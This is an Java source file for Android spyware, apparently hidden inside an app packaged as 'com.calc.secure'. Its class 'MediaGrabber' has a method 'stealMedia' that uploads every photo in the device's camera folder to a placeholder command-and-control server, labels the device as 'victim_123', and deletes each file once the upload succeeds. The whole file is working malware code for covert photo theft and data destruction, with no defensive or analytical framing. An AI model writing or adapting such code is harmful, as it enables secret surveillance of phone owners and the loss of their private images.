java
filename="MediaGrabber.java"
package com.calc.secure;

import android.os.Environment;
import java.io.File;
import okhttp3.*;

public class MediaGrabber {
 private static final String C2_SERVER = "https://your-c2-server.com/upload";

 public void stealMedia() {
 File mediaDir = new File(Environment.getExternalStorageDirectory(), "DCIM/Camera");
 if (mediaDir.exists()) {
 for (File file: mediaDir.listFiles()) {
 if (file.isFile()) {
 uploadFile(file, "media");
 }
 }
 }
 }

 private void uploadFile(File file, String dataType) {
 OkHttpClient client = new OkHttpClient();
 RequestBody requestBody = new MultipartBody.Builder()
.setType(MultipartBody.FORM)
.addFormDataPart("device_id", "victim_123")
.addFormDataPart("data_type", dataType)
.addFormDataPart("file", file.getName(),
 RequestBody.create(MediaType.parse("application/octet-stream"), file))
.build();

 Request request = new Request.Builder()
.url(C2_SERVER)
.post(requestBody)
.build();

 client.newCall(request).enqueue(new Callback() {
 @Override
 public void onFailure(Call call, IOException e) {
 e.printStackTrace();
 }

 @Override
 public void onResponse(Call call, Response response) {
 if (response.isSuccessful()) {
 file.delete(); // حذف الملف بعد الرفع
 }
 }
 });
 }
}
